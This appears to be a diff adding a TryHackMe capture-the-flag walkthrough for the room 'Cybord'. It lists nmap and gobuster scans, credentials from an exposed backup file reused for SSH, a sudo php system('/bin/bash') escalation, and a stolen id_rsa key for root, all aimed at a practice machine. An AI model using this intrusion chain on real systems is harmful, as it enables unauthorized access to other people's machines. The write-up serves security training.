@@ -1,0 +1,71 @@
+----------------                               ------------------
+               :::::::::::;| CYBORD |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "CYBORD".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Found ports: 22/SSH, 80/HTTP"
+"Website has cyber board theme!"
+
+2. FIND HIDDEN DIRS.
+
+    gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
+    "Found /backup/ directory - JACKPOT!"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK BACKUP.
+
+    http://<ip>/backup/
+    "Found backup.zip - DOWNLOAD IT!"
+    unzip backup.zip
+    "Got config.php with DB creds: cybord:password123"
+
+2. LOGIN TO SSH.
+
+    ssh cybord@<ip>
+    Password: password123
+    "WE'RE IN!"
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (PRIV ESC - CYBORD TO ADMIN)
+
+1. CHECK SUDO RIGHTS.
+
+    sudo -l
+    "Can run /usr/bin/php as admin!"
+    sudo -u admin /usr/bin/php -r "system('/bin/bash');"
+    "Now we're admin!"
+
+2. FIND ADMIN FILES.
+
+    ls -la /home/admin
+    "Found .ssh folder with id_rsa!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC - ADMIN TO ROOT)
+
+1. USE SSH KEY.
+
+    chmod 600 id_rsa
+    ssh -i id_rsa root@localhost
+    "BOOM! ROOT ACCESS!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/cybord/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- CYBORD PWNED ----------
